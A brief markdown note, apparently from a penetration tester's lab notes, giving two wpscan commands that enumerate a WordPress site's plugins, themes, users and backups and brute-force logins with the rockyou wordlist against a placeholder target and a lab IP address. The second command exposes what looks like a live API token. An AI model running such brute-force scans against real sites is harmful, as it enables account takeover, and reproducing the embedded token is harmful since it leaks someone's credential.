# Scan vulnerability + bruteforce passwords
```bash
# at: all theme
# tt: timthumbs
wpscan --rua -e ap,at,tt,cb,dbe,u,m --api-token $WPSCAN_API_TOKEN --passwords /vagrant/wordlist/rockyou.txt --url http://TARGET

wpscan --rua -e ap,cb,dbe,u,m --api-token Usp8VWjBXl4ECLs5ZGXYvUSZQ5iyjs3mw0BB57j1hes --passwords /vagrant/wordlist/rockyou.txt --url http://10.10.235.45
```
